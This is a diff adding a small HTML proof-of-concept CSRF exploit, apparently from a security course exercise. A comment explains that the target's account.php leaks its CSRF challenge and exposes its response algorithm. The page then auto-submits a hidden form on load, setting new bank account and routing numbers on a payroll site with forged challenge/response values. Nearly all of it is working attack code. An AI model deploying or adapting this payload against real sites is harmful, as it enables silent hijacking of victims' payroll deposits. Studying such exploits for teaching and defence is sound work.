@@ -1,0 +1,22 @@
+<!---the vulnerable code is in account.php: 24 and 61-81 because line 24 gives out the info directly used for CSRF protection and line 61-81 as the algorithm used for CSRF protection is accessable to attacker, attacker can set the form value or compute the value with same algorithm, thus bypass the CSRF proctection-->
+
+<html>
+
+<body onload="myclick();">
+
+<form  id="my_form" action="http://payroll.gatech.edu/account.php" onsubmit="" method="POST">
+
+<input type="text" name="account" value="2133721337">
+
+<input type="text" name="routing" value="4242424242">
+       <input id="csrfc" name="challenge" value="786680161" type="hidden">
+       <input id="csrfr" name="response" value="23758" type="hidden">
+<button id="my_btn" class="btn submit" name="action" value="save">Save</button>	   
+</form>
+<script type="text/javascript">
+   function myclick () {
+    document.getElementById("my_btn").click();
+}
+</script>
+</body>
+</html>
